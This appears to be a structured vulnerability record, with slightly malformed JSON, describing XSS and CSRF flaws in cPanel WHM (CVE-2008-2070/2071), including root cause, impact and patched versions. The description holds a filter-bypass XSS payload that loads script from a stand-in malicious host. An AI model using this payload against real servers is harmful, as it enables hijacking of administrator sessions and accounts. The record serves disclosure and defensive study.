  "cve": "CVE-2008-2070",
  "description": "There are XSS (identified by CVE-2008-2070) and CSRF (identified by CVE-2008-2071) vulnerabilities on cPanel software. On WHM there is a simple pattern for XSS defense, but this function is not well implemented so it's possible to bypass it using a simple cheat. This is a simple proof of concept:\n>><<<<<<<<<<<<script src=\"http://malicious.site/code.js\" a=>>>>>>>><\nIn this way the function don't sanitize the string so it's possible to inject arbitrary JavaScript/HTML code. WHM provide, to the administrator or reseller, all function for manage the server via Web interface but don't protect them against Cross Request Forgery (CSRF). To exploit this vulnerability is not necessary to inject any kind of code to the victim.\nXSS and CSRF flaw is more simple to exploit with cPanel XMLAPI [1] that use Authentication Basic of WHM (This API works on the same domain and port of WHM).",
  "vulnerability_details": {
    "root_cause": "The XSS vulnerability is due to insufficient input sanitization in WHM (Web Host Manager) interface. The XSS defense mechanism can be bypassed using a simple injection, allowing arbitrary JavaScript/HTML code to be injected.",
    "weaknesses": [
      "Cross-Site Scripting (XSS)",
      "Insufficient Input Sanitization"
    ],
    "impact": "The XSS can be used for create/modify accounts or retrieve important informations about them.",
    "attack_vectors": "The vulnerability is present in any function that manages user input.  Examples include Knowlege Base, Change IP to domain, and List user account functions. The vulnerability can be exploited via a specially crafted URL.",
     "attacker_capabilities": "The attacker needs to be able to craft a malicious URL containing a XSS payload.  The attacker must also be able to induce a user to access the malicious URL, typically a WHM administrator.  Exploitation is more simple using the cPanel XML API, which uses basic authentication on the same domain and port as WHM."

    "affected_software": {
        "name": "cPanel",
        "versions": "Tested on WHM 11.15.0 and cPanel 11.18.3-R21703"
    },
  "patch": "Vendor released a new version where the XSS flaw is resolved and CSRF mitigated enough to consider it trivial. Update the cPanel to latest release of yours build. All 11.18.4+ and 11.22.3+ builds include the patch."
